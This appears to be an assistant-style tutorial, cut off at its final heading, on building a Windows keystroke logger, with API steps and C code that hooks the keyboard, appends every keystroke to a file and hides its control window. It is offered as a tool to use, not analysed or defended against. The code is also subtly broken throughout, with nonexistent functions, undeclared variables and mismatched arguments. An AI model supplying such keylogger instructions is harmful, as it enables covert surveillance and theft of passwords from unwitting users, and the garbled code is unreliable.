To create a keystroke logging utility on a Windows system, follow these steps:

### Step-by-Step Explanation:

1. **Objective**: Capture and log all keyboard keystrokes on a Windows computer.

2. **Tools Needed**:
   - Microsoft Visual Studio (for coding)
   - Windows SDK or the Windows API libraries.

3. **API Functions**:
   - `SetWindowsHook`: Installs a keyboard hook.
   - `GetKeyState`: Retrieves the state of a keyboard key.
   - `GetAsyncKeyState`: Checks the state of a key without waiting.
   - `UnhookKeyboard`: Removes the keyboard hook.
   - `GetWindowRect`: To disable and enable the hook window.

4. **Implementation Steps**:

   - **Include Necessary Headers**: Include `Windows.h` and `User32.h` for Windows API functions.
   - **Initialize Variables**:
     - `HWND hwnd`: Handle of the window to disable/enable.
     - `HHOOK hookID`: Identifier for the hook.
     - `FILE *file`: Pointer to the log file.
   - **Set Up the Hook**:
     - Use `SetWindowsHook` with `WH_KEYBOARD_LL` to install the hook.
     - Create a window to control the hook's visibility.
   - **Loop to Capture Keystrokes**:
     - Use a loop to check key states.
     - Use `GetKeyState` to check if a key is pressed or released.
     - Capture the keystroke and append to the log file.
     - Sleep briefly to prevent high CPU usage.
   - **Disable/Enable the Hook**:
     - Use `GetWindowRect` to check if the hook window covers the screen.
     - Enable the hook only when the window is not covering the screen.
   - **Stop the Hook**:
     - Break the loop when the hook is removed.
     - Use `UnhookKeyboard` to remove the hook.

5. **Code Structure**:

   ```c
   #include <windows.h>
   #include <stdio.h>

   #define FILENAME "keylog.txt"

   // Function prototypes
   void LogKeystroke(int, int);
   void EnableHook(void);
   void DisableHook(void);

   int main() {
       HWND hwnd = 0;
       int hookID = 0;
       FILE *file = fopen(FILENAME, "a");

       // Initialize the hook
       hookID = SetWindowsHook(WH_KEYBOARD_LL, LogKeystroke);

       // Create a window to control the hook
       hwnd = CreateWindow("MyKeyLogger", 0, WS_OVERLAPPSWITCH | WS_VISIBLE | WS_CAPTION, 0, 0, 0, 0, 0, HWND_DESKTOP, 0, 0);

       EnableHook();

       // Loop to capture keystrokes
       while (true) {
           GetWindowRect(hwnd, &rect);
           if (rect.left == 0 && rect.top == 0) {
               DisableHook();
               break;
           }
           Sleep(100); // Prevent high CPU usage
       }

       // Release resources
       if (file) {
           fclose(file);
       }
       DestroyWindow(hwnd);
       UnhookKeyboard(hookID);
       return 0;
   }

   // Function to handle keyboard events
   LRESULT LogKeystroke(int nCode, WPARAM wParam, LPARAM lParam) {
       char key = '\0';
       static lastKey = 0;
       static int lastTime = 0;

       if (wParam == WM_KEYDOWN) {
           if (wParam == VK_SHIFT) {
               key = '~';
           } else if (wParam == VK_CONTROL) {
               key = ':';
           } else if (wParam == VK_ALT) {
               key = ';';
           } else {
               key = (char)wParam;
           }
           if (key != '\0' && key != lastKey) {
               // Log the keystroke
               fprintf(file, "[%d] %c %d\n", GetTickCount(), key);
               lastKey = key;
               lastTime = GetTickCount();
           }
       } else if (wParam == WM_KEYUP) {
           lastKey = '\0';
       }

       return 0;
   }

   // Function to enable the hook
   void EnableHook() {
       ShowWindow(hwnd, SW_MINIMIZE);
       GetWindowRect(hwnd, &rect);
       rect.left = rect.top = 0;
       rect.right = rect.bottom = GetWindowRect(GetDesktopWindow(), &desktopRect);
       SetWindowRect(hwnd, rect);
       EnableWindow(hwnd);
   }

   // Function to disable the hook
   void DisableHook() {
       ShowWindow(hwnd, SW_HIDE);
       EnableWindow(hwnd);
   }
   ```

6. **Considerations**:
